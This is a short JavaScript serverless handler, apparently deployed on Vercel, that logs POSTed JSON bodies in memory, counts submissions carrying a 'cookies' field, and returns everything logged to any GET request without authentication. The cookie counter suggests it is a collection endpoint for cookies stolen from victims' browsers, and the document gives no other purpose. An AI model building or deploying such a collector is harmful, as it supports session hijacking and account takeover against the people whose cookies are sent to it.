let posts = [];
let cookieCount = 0;

export default function handler(req, res) {
  if (req.method === 'POST') {
    let body = req.body;
    // Vercel bazen body'yi otomatik parse etmez, düzeltme:
    if (typeof body === 'string') {
      try { 
        body = JSON.parse(body); 
      } catch {}
    }

    // Check if the request contains cookie data and increment counter
    if (body && body.cookies) {
      cookieCount++;
    }

    const data = {
      time: new Date().toISOString(),
      body,
      totalCookies: cookieCount
    };
    posts.unshift(data);
    res.status(200).json({ status: 'ok', received: data });
  } else if (req.method === 'GET') {
    res.status(200).json(posts);
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}